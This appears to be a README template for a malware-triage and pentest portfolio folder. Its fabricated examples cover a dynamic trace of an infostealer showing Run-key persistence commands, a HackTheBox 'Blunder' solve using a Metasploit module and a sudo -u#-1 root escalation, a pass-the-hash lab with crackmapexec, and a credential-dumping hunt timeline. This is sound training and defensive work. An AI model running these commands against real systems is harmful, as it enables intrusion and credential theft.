# 02_dynamic

**Third phase folder — meaning depends on engagement kind.**

| Kind | What this folder holds |
|------|------------------------|
| `file` | Dynamic triage (Procmon, Process Explorer, TCPView, network captures) |
| `ctf` | Solve attempt (approach log, commands/exploits tried, pivots, flag capture) |
| `lab` | Results (objectives completion, errors encountered, proof/output) |
| `hunt` | Analysis (timeline, pattern correlation, false positives, IOC candidates) |

---

**For `file` engagements:** Dynamic triage notes — what happens when you run it, instrument it, and watch it.

Each `sample_XX.md` in this folder documents runtime behavior observed during a
controlled execution inside an isolated VM: process activity, file drops, registry
writes, and network connections, all captured with Sysinternals and/or other tooling.

---

## What goes here

| Section | Examples |
|---------|---------|
| Session metadata | SHA256, date, VM type, AV state, snapshot name, tools used |
| Pre-flight checklist | Snapshot taken, Procmon running, tools open before exec |
| Execution details | How launched, from what path, as what user |
| Process tree | Parent/child PIDs, command lines from Process Explorer |
| File system events | WriteFile / CreateFile on suspicious paths (Procmon filtered) |
| Registry events | RegSetValue hits, especially persistence and config keys |
| Network events | TCP/UDP connections, DNS queries (TCPView / Procmon / Wireshark) |
| Post-run observations | Services, scheduled tasks, injected modules, UAC prompts |
| Dynamic summary | One-paragraph portfolio-ready writeup of what the dynamic pass proved |
| Screenshot index | Which screenshots map to which tool captures |
| Cross-references | Links to all other phase files |

## What does NOT go here

- Static observations (DIE, PEStudio, entropy) — those go in `01_static/`
- Verdict and final classification — those go in `03_findings/`
- The raw Procmon CSV export — too large, not committed; summarise in tables here
- Host machine paths, real usernames, or internal infrastructure details

## Tips

- Always **revert the snapshot after** capturing your logs and screenshots — never
  leave a dynamic run live.
- Filter Procmon **before** executing: set a filter like `Process Name is
  <yoursample>.exe` (or the likely child name) so you can focus the log.
- **Export early** — Procmon CSV exports can be 100 MB+; export, trim to interesting
  events, and then revert.
- Record **exact command lines** from Process Explorer's process properties; they often
  reveal argument-passing, dropped names, and LOLBin abuse.
- If network traffic is encrypted, note the remote IP and port anyway — even without
  decryption, pattern (beacon interval, JA3/S fingerprint, byte count) is useful.
- If a section is **not captured** (you ran without Procmon, for example), say so
  explicitly rather than leaving the table empty — it documents the gap.

---

## Complete example (made-up — for reference only)

> **This entire block is a fabricated example.**
> Sample ID, hashes, paths, domain names, IPs, registry keys, and all behavioral
> details are invented for illustration. They do not correspond to any real file
> in this repository. The IP `192.0.2.47` is from RFC 5737 TEST-NET and is not
> routable; it is used here as a clearly fictional stand-in.

---

### sample_EX -- dynamic triage

| Field | Value |
|-------|-------|
| **SHA256** | `4f3a8b2c1d9e7f06a5b4c3d2e1f09876543abcdef1234567890abcdef12345678` |
| **Date analyzed** | 2026-04-15 |
| **VM type** | Windows 10 22H2 lab VM (user `win11`) |
| **AV / real-time protection** | Off (Windows Defender disabled for analysis) |
| **Snapshot name** | `clean_baseline_20260415` |
| **Instrumentation** | Procmon 3.96, Process Explorer 17.05, TCPView 4.19, Wireshark 4.2.4 |

Cross-references: [findings](../03_findings/sample_EX.md) | [static](../01_static/sample_EX.md) | [acquisition](../00_original/sample_EX.md) | [screenshots](../50_screenshots/sample_EX/)

---

#### Pre-flight checklist

- [x] **Clean snapshot** `clean_baseline_20260415` restored and verified.
- [x] **Procmon** started before execution; filter `Process Name is InvoiceHelper_Setup.exe` set.
- [x] **Process Explorer** open and visible.
- [x] **TCPView** open and visible.
- [x] **Wireshark** capturing on `Ethernet0` (internal lab adapter).
- [x] **AV / real-time protection** confirmed off (Settings > Windows Security).
- [x] Network connectivity: lab-isolated; internet-routed traffic blocked at hypervisor.

---

#### Execution

- **How launched:** Double-clicked from `C:\Users\win11\Desktop\` (copied from
  Downloads folder for clean path test).
- **On-disk name in VM:** `InvoiceHelper_Setup.exe` (renamed from SHA256 filename for
  clarity in Procmon filter).
- **User context:** Standard user (`win11`), no UAC elevation prompted or accepted.
- **Immediate visible behavior:** Fake installer progress bar appeared (titled
  "Adobe Invoice Helper — Installing…") for approximately 3 seconds, then disappeared
  with no success dialog. Desktop appeared unchanged. No tray icon.

---

#### Process tree (Process Explorer — shot_007.png)

| PID | Parent PID | Name | Command line / notes |
|-----|-----------|------|---------------------|
| 4820 | 3104 (Explorer) | `InvoiceHelper_Setup.exe` | Launched by user. |
| 5112 | 4820 | `cmd.exe` | `cmd.exe /c copy "InvoiceHelper_Setup.exe" "%APPDATA%\Microsoft\Windows\InvoiceHelper\svchost32.exe"` — self-copy to persistence path. |
| 5244 | 4820 | `reg.exe` | `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v InvoiceHelper /t REG_SZ /d "%APPDATA%\Microsoft\Windows\InvoiceHelper\svchost32.exe" /f` — persistence registration. |
| 5360 | 4820 | `svchost32.exe` | Launched from `%APPDATA%\Microsoft\Windows\InvoiceHelper\` — **note: not the real Windows svchost.exe** (wrong path, wrong parent). |
| 5412 | 5360 | `svchost32.exe` | Second instance / watchdog thread; same binary, no new arguments. |

**Observation:** Parent spawns `cmd.exe` and `reg.exe` (LOLBin abuse for persistence),
then launches a dropped copy from Roaming. The process name `svchost32.exe` is chosen
to blend with legitimate `svchost.exe` in a casual task manager view.

---

#### File system (Procmon WriteFile / CreateFile — shot_008.png)

| Path | Operation | Notes |
|------|-----------|-------|
| `C:\Users\win11\AppData\Roaming\Microsoft\Windows\InvoiceHelper\` | CreateFile (directory) | Drop directory created. |
| `C:\Users\win11\AppData\Roaming\Microsoft\Windows\InvoiceHelper\svchost32.exe` | WriteFile | Self-copy (2,491,392 bytes — matches original). |
| `C:\Users\win11\AppData\Roaming\Microsoft\Windows\InvoiceHelper\cfg.dat` | WriteFile | 128-byte config file; hex preview shows structured header `IH\x01\x00` + AES-looking block. |
| `C:\Users\win11\AppData\Local\Temp\~tmp4F3A.tmp` | WriteFile + DeleteFile | Temp staging file, deleted immediately after copy. |
| `C:\Users\win11\AppData\Local\Google\Chrome\User Data\Default\Login Data` | ReadFile | **Chrome credential database opened for read.** |
| `C:\Users\win11\AppData\Local\Google\Chrome\User Data\Default\Login Data-journal` | ReadFile | SQLite journal — read alongside Login Data. |
| `C:\Users\win11\AppData\Roaming\Mozilla\Firefox\Profiles\z3xk1mnt.default-release\logins.json` | ReadFile | **Firefox credential file opened for read.** |
| `C:\Users\win11\AppData\Roaming\Microsoft\Windows\InvoiceHelper\ex_001.bin` | WriteFile | ~4 KB encrypted output blob (exfil staging file). |

**Key findings:** Self-copy for persistence, config drop, Chrome and Firefox credential
stores read within 2 seconds of execution, encrypted output blob staged before first
network event.

---

#### Registry (Procmon RegSetValue — shot_009.png)

| Key | Value name | Data | Notes |
|-----|-----------|------|-------|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | `InvoiceHelper` | `C:\Users\win11\AppData\Roaming\Microsoft\Windows\InvoiceHelper\svchost32.exe` | **Persistence.** Survives reboot. |
| `HKCU\Software\InvoiceHelper` | `install_date` | `20260415` | Internal config key — install date stamp. |
| `HKCU\Software\InvoiceHelper` | `uid` | `WIN11-7F3A-2026` | Generated victim UID (machine fingerprint). |
| `HKCU\Software\InvoiceHelper` | `version` | `2.1` | Build version matching string in static analysis. |
| `HKCU\Software\Classes\http\shell\open\command` | _(default)_ | _(deleted — value removed after 1 sec)_ | Attempted browser default hijack, reverted (possibly anti-sandbox check). |

**Key findings:** Standard `Run` key persistence. Custom `HKCU\Software\InvoiceHelper`
config hive created. Brief attempt at browser hijack detected and reverted (may
indicate sandbox-aware behavior).

---

#### Network (TCPView + Wireshark — shot_010.png, shot_011.png)

| Time (rel.) | Proto | Local | Remote | Port | Size | Notes |
|-------------|-------|-------|--------|------|------|-------|
| T+00:04 | TCP | VM:50412 | 192.0.2.47 | 8080 | 312 B (out) | **C2 beacon #1** — `POST /gate.php HTTP/1.1`. |
| T+00:04 | TCP | VM:50412 | 192.0.2.47 | 8080 | 88 B (in) | Server response `HTTP/1.1 200 OK`, 32-byte body (likely task assignment). |
| T+00:06 | TCP | VM:50412 | 192.0.2.47 | 8080 | 4318 B (out) | **C2 exfil #1** — `POST /log.php`. Wireshark body not plaintext (AES stream). |
| T+00:06 | TCP | VM:50412 | 192.0.2.47 | 8080 | 44 B (in) | Server ACK response. |
| T+02:30 | TCP | VM:50413 | 192.0.2.47 | 8080 | 312 B (out) | **C2 beacon #2** — same `POST /gate.php`, 150-second interval. |
| T+02:30 | TCP | VM:50413 | 192.0.2.47 | 8080 | 88 B (in) | Same 32-byte response pattern (idle tasking). |

**C2 pattern:** 150-second beacon interval, `HTTP/1.1` over port 8080, path `/gate.php`
(check-in) and `/log.php` (data upload). Traffic not plaintext — AES per static strings
and Wireshark entropy analysis. **No DNS query observed** — IP is hardcoded (consistent
with strings in static pass).

**Wireshark filter used:** `tcp.port == 8080 and ip.addr == 192.0.2.47`

---

#### Post-run observations

- **Services:** No new services registered (checked with `sc query state=all` diff).
- **Scheduled tasks:** No new tasks (checked with `schtasks /query` diff).
- **Injected modules:** Process Explorer shows `svchost32.exe` loaded standard system
  DLLs only — no obvious injected foreign module in module list.
- **UAC:** No prompt at any point — everything ran as standard user under `HKCU`.
- **Anti-analysis behavior:** Transient browser hijack attempt reverted within 1 second
  (possible sandbox check — sees no victim browser profile, aborts).
- **Cleanup:** `~tmp4F3A.tmp` self-deleted within 100ms of drop.

---

#### Dynamic summary (portfolio-ready)

After execution, the sample performed four actions in rapid succession: it created a
**persistence directory** under `%APPDATA%\Microsoft\Windows\InvoiceHelper\`, dropped
a **self-copy renamed `svchost32.exe`** (name chosen to mimic legitimate Windows
processes), registered a **Run key** for startup persistence, and immediately **read
Chrome and Firefox credential stores**. Within four seconds, it beaconed to a
hardcoded IP over **HTTP/1.1 port 8080** (`/gate.php`), received a task response, and
posted an **encrypted 4 KB blob** (`/log.php`) consistent with the AES exfiltration
path identified in static strings. A 150-second beacon interval was observed. No DNS
queries were issued — the C2 address is hardcoded. No kernel-level persistence,
service installation, or UAC bypass was observed in this pass.

---

#### Screenshots index

| # | File | Tool | What it shows |
|---|------|------|---------------|
| 7 | `shot_007.png` | **Process Explorer** | Full process tree: setup → cmd → reg → svchost32 |
| 8 | `shot_008.png` | **Procmon (FS filter)** | File write events: drop dir, self-copy, cfg.dat, credential reads |
| 9 | `shot_009.png` | **Procmon (Registry filter)** | Run key write, InvoiceHelper config hive |
| 10 | `shot_010.png` | **TCPView** | Active connection to 192.0.2.47:8080 |
| 11 | `shot_011.png` | **Wireshark** | POST /gate.php and POST /log.php captures |

---

## Complete example -- CTF (solve attempt)

**Engagement:** `sample_EX` -- HackTheBox "Blunder" (Retired), continuing from recon phase.

---

### Session metadata

| Field | Value |
|-------|-------|
| Target IP | 10.10.10.191 |
| Auth credentials | `fergus:RolandDeschain` (from recon phase) |
| Exploit references | EDB-47699 (Bludit dir traversal upload) |
| Date | 2026-05-11 |
| Machine | Kali Linux (local VM) |

---

### Approach log

#### Step 1 -- Exploit directory traversal upload (CVE-2019-16113)

`ash
msfconsole
use exploit/linux/http/bludit_upload_images_exec
set RHOSTS 10.10.10.191
set BLUDITUSER fergus
set BLUDITPASS RolandDeschain
run
`

**Result:** Shell returned as www-data.

#### Step 2 -- User enumeration

`ash
cat /etc/passwd | grep -v nologin | grep -v false
`

| User | Home |
|------|------|
| root | /root |
| hugo | /home/hugo |

#### Step 3 -- Credential search

`ash
find / -name "users.php" 2>/dev/null
`

Found sha1 hash for hugo in /var/www/bludit-3.10.0a. Cracked with hashcat -m 100 -- result: **Password120**.

#### Step 4 -- User flag

`ash
su hugo
cat /home/hugo/user.txt
`

User flag obtained. (Redacted -- public_writeup_safe: false)

#### Step 5 -- Root via CVE-2019-14287

`ash
sudo -l
# (ALL, !root) NOPASSWD: /bin/bash
sudo -u#-1 /bin/bash
id    # uid=0(root)
cat /root/root.txt
`

Root flag obtained. Box fully solved.

---

### Dead ends

| Attempt | Result |
|---------|--------|
| FTP port 21 | Filtered |
| SSH with fergus credentials | Port closed |
| bludit-3.9.2 user DB | Empty -- had to find 3.10.0a path |

---

### Screenshots index

| # | File | Tool | What it shows |
|---|------|------|---------------|
| 5 | shot_005.png | **Metasploit** | Shell as www-data |
| 6 | shot_006.png | **Terminal** | users.php hugo hash |
| 7 | shot_007.png | **Terminal** | su hugo, user.txt |
| 8 | shot_008.png | **Terminal** | sudo -l output |
| 9 | shot_009.png | **Terminal** | sudo -u#-1, id=root, root.txt |

Cross-references: [brief](../00_original/sample_EX.md) | [recon](../01_static/sample_EX.md) | [writeup](../03_findings/sample_EX.md)

---

## Complete example -- Lab (results / objectives)

**Engagement:** `sample_EX` -- TCM Security Practical Ethical Hacking, Module 8, continuing from step log.

---

### Objectives completion

| # | Objective | Status |
|---|-----------|--------|
| 1 | Capture NTLMv2 hash via LLMNR poisoning | **Met** |
| 2 | Crack captured hash | **Met** -- Password1 |
| 3 | Enumerate SMB shares after auth | **Met** |
| 4 | Identify pass-the-hash opportunity | **Met** |

### SMB share enumeration

`ash
crackmapexec smb 192.168.64.0/24 -u fcastle -p 'Password1' --shares
`

| Host | Share | Access |
|------|-------|--------|
| HYDRA-DC | SYSVOL | READ |
| HYDRA-DC | NETLOGON | READ |
| WORKSTATION-01 | C$ | No access |

### Pass-the-hash

`ash
crackmapexec smb 192.168.64.0/24 -u peterparker -H '<NTLMhash>'
`

Result: WORKSTATION-02 **Pwn3d!** -- local admin confirmed.

### Errors encountered

| Step | Error | Resolution |
|------|-------|-----------|
| crackmapexec | No entries | Forgot -u flag |
| hashcat | No hashes loaded | NTLMv2 hash truncated on paste |

---

### Screenshots index

| # | File | Tool | What it shows |
|---|------|------|---------------|
| 3 | shot_003.png | **crackmapexec** | SMB share list |
| 4 | shot_004.png | **crackmapexec** | Pass-the-hash Pwn3d! |

Cross-references: [setup](../00_original/sample_EX.md) | [procedure](../01_static/sample_EX.md) | [reflection](../03_findings/sample_EX.md)

---

## Complete example -- Hunt (analysis / timeline)

**Engagement:** `sample_EX` -- Internal hunt: LSASS credential access, continuing from collection.

---

### Timeline reconstruction

| Timestamp | Host | Event | Source |
|-----------|------|-------|--------|
| 2026-04-22 13:52 | WRK-04 | winword.exe opened Q1_Report.docx | Sysmon 1 |
| 2026-04-22 13:53 | WRK-04 | winword.exe spawned powershell.exe -enc | Sysmon 1 |
| 2026-04-22 13:54 | WRK-04 | PowerShell wrote C:\Windows\Temp\svch0st.exe | Sysmon 11 |
| 2026-04-22 13:58 | WRK-04 | svch0st.exe executed (parent: powershell) | Sysmon 1 |
| 2026-04-22 14:03 | WRK-04 | svch0st.exe accessed lsass.exe 0x1FFFFF | Sysmon 10 |
| 2026-04-22 14:04 | WRK-04 | svch0st.exe wrote C:\Windows\Temp\kr.tmp | Sysmon 11 |
| 2026-04-22 14:06 | WRK-04 | Outbound 443 to 185.220.x.x from svch0st.exe | Sysmon 3 |
| 2026-04-22 14:09 | WRK-04 | svch0st.exe deleted kr.tmp and itself | Sysmon 23 |

---

### False positive triage

| Signal | FP or TP? | Reasoning |
|--------|-----------|-----------|
| MsMpEng.exe LSASS 0x1410 | FP | Regular Defender scan |
| svch0st.exe LSASS 0x1FFFFF | **TP** | Leet-spelling + Temp path + PROCESS_ALL_ACCESS |
| kr.tmp create/delete 5 min | **TP** | Dump then cleanup sequence |
| Outbound 443 from svch0st.exe | **TP** | Non-browser to non-CDN IP |

---

### Detection recommendations

1. Sigma rule: winword.exe -> powershell.exe -enc chain.
2. Alert: LSASS 0x1FFFFF from non-allowlisted process.
3. Alert: .exe drop to C:\Windows\Temp from Office processes.
4. Block: 185.220.x.x range (Tor relay / confirmed C2).

---

### Screenshots index

| # | File | Tool | What it shows |
|---|------|------|---------------|
| 4 | shot_004.png | **Elastic SIEM** | WRK-04 full timeline |
| 5 | shot_005.png | **Elastic SIEM** | FP triage: MsMpEng vs svch0st |
| 6 | shot_006.png | **Sigma** | Draft detection rule |

Cross-references: [brief](../00_original/sample_EX.md) | [collection](../01_static/sample_EX.md) | [outcome](../03_findings/sample_EX.md)
